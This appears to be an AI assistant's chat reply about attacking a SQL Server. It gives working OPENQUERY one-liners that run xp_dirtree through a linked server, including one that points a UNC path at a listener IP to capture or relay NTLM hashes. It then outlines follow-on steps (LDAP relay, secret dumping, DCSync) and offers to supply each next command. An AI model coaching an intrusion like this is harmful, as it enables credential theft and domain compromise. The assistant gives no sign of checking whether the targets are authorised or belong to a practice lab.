Understood. Below are **valid, single-line, single-statement `OPENQUERY` executions** for `xp_dirtree`. No batching, no context switching.

---

### 1️⃣ Execute `xp_dirtree` on a local path (ONE LINE)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'EXEC master..xp_dirtree ''C:\'',1,1')
```

---

### 2️⃣ Execute `xp_dirtree` to trigger UNC authentication (NTLM capture) (ONE LINE)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'EXEC master..xp_dirtree ''\\10.10.14.5\share'',1,1')
```

Replace `10.10.14.5` with **your listener IP** (Responder / ntlmrelayx).

---

### 3️⃣ Verify execution context (ONE LINE)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'SELECT SYSTEM_USER')
```

---

### 4️⃣ Check if `xp_dirtree` is callable (permission test) (ONE LINE)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'SELECT HAS_PERMS_BY_NAME(''xp_dirtree'',''OBJECT'',''EXECUTE'')')
```

Result:

- `1` → callable
    
- `0` → blocked
    

---

## Expected behavior

- `xp_dirtree` **does not require `xp_cmdshell`**
    
- Executes as **SQL Server service account**
    
- UNC paths → **automatic NTLM authentication**
    
- Perfect for **hash capture / relay**
    

---

## Common pitfalls (you avoided them)

❌ `USE master`  
❌ multiple statements  
❌ semicolon chaining

`OPENQUERY` executes **exactly what you give it**.

---

If NTLM hits your listener, next steps are:

- Relay to LDAP / LDAPS
    
- Dump secrets
    
- DCSync
    

Paste output or confirm NTLM traffic and I’ll give you the **next exact one-liner**.